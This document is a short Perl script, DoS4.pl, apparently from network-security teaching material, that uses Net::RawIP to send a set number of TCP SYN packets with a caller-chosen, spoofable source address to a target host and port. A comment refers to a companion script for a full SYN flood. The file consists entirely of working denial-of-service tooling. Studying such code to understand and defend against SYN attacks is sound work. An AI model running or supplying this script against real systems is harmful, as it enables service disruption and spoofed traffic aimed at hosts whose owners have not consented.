#!/usr/bin/perl

### DoS4.pl  
### by Avi Kak

use strict;
use Net::RawIP;

# This script is for sending a fixed number of SYN packets
# to a target host.

# If you want to create SYN flood, use DoS5.pl

die "usage syntax>>   DoS4.pl source_IP source_port " . 
                      "dest_IP dest_port how_many_packets $!\n" 
                      unless @ARGV == 5;

my ($srcIP, $srcPort, $destIP, $destPort, $count) = @ARGV;

my $packet = new Net::RawIP;
$packet->set({ip => {saddr => $srcIP,
                     daddr => $destIP},
              tcp => {source => $srcPort,
                      dest =>   $destPort,
                      syn => 1,
                      seq => 111222}});
for (1..$count) {
    $packet->send;
}
